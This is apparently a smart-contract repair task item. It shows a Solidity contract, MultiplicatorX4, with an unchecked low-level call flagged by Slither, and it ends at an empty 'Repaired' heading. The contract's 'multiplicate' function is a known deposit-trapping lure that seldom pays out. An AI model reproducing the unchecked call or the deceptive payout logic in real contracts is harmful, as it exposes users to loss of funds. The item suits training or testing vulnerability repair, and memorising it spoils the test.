/// Your task is to repair the following Solidity Smart Contract
pragma solidity ^0.4.18;

contract MultiplicatorX4 {
    address public Owner = msg.sender;

    function() public payable {}

    function withdraw() public payable {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address adr, bytes data) public payable {
        require(msg.sender == Owner);

        adr.call.value(msg.value)(data);
    }

    function multiplicate(address adr) public payable {
        if (msg.value >= this.balance) {
            adr.transfer(this.balance + msg.value);
        }
    }
}

/// This Solidity Smart Contract has been analyzed by smart contract analyzers. Here are the results from these analyzers.

/// 1. Slither Analysis Results
/// 1.1. Vulnerability: unchecked_low_level_call at Line 13-17:
    function Command(address adr, bytes data) public payable {
        require(msg.sender == Owner);

        adr.call.value(msg.value)(data);
///  Message:Low level call in MultiplicatorX4.Command (0x3e013fc32a54c4c5b6991ba539dcd0ec4355c859.sol#13-17):
///   	-adr.call.value(msg.value)(data) 0x3e013fc32a54c4c5b6991ba539dcd0ec4355c859.sol#16



/// Repaired Solidity Smart Contract